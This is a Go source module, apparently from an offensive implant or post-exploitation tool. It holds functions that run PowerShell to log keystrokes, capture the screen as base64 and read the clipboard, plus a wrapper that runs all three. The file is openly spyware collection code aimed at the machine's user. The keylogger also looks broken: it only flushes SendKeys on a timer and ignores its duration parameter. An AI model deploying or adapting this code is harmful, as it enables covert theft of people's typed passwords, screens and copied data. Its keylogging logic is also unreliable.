package module

import (
	"fmt"
	"strings"
)

// RunCollectKeylog captures keystrokes on Windows using PowerShell.
func RunCollectKeylog(params map[string]interface{}) (string, error) {
	duration := "5"
	if d, ok := params["duration"].(string); ok {
		duration = d
	}
	_ = duration

	cmds := []string{
		"echo '=== Windows Keylog ==='",
		`powershell -Command "$t=[AppDomain]::CurrentDomain.DefineDynamicAssembly(1,1).DefineDynamicModule(1,1,$true).DefineType('K','AutoClass,AnsiClass,BeforeFieldInit,Public',[System.Windows.Forms.Form]);$k=$t.DefineField('kb',[System.Windows.Forms.Timer],'Public,Static');$f=$t.CreateType();$m=[Activator]::CreateInstance($f);$tb=[System.Windows.Forms.Timer]$f.GetField('kb').GetValue($null);$tb.add_Tick({try{[System.Windows.Forms.SendKeys]::Flush()}catch{}});$tb.Interval=1000;$tb.Start();Start-Sleep -Seconds 5;$tb.Stop()" 2>&1 || echo 'Keylog requires System.Windows.Forms — try on Windows with .NET'`,
	}
	return run(strings.Join(cmds, "\n"))
}

// RunCollectScreenshot captures the screen on Windows.
func RunCollectScreenshot(_ map[string]interface{}) (string, error) {
	cmds := []string{
		"echo '=== Screenshot ==='",
		`powershell -Command "Add-Type -AssemblyName System.Drawing; $s=[System.Windows.Forms.Screen]::PrimaryScreen.Bounds; $b=New-Object System.Drawing.Bitmap $s.Width,$s.Height; $g=[System.Drawing.Graphics]::FromImage($b); $g.CopyFromScreen($s.X,$s.Y,0,0,$s.Size); $ms=New-Object System.IO.MemoryStream; $b.Save($ms,[System.Drawing.Imaging.ImageFormat]::Png); [System.Convert]::ToBase64String($ms.ToArray())" 2>&1 || echo 'Screenshot failed'`,
	}
	return run(strings.Join(cmds, "\n"))
}

// RunCollectClipboard reads clipboard content on Windows.
func RunCollectClipboard(_ map[string]interface{}) (string, error) {
	cmds := []string{
		"echo '=== Clipboard ==='",
		"powershell -Command \"Get-Clipboard\" 2>&1 || echo 'Clipboard read failed'",
	}
	return run(strings.Join(cmds, "\n"))
}

// RunCollectAll runs all collection probes.
func RunCollectAll(params map[string]interface{}) (string, error) {
	var parts []string
	probes := []struct {
		name string
		fn   func(map[string]interface{}) (string, error)
	}{
		{"KEYLOG", RunCollectKeylog},
		{"SCREENSHOT", RunCollectScreenshot},
		{"CLIPBOARD", RunCollectClipboard},
	}
	for _, p := range probes {
		out, err := p.fn(params)
		if err != nil {
			parts = append(parts, fmt.Sprintf("=== %s ===\nERROR: %v", p.name, err))
		} else {
			parts = append(parts, fmt.Sprintf("=== %s ===\n%s", p.name, out))
		}
	}
	return strings.Join(parts, "\n\n"), nil
}
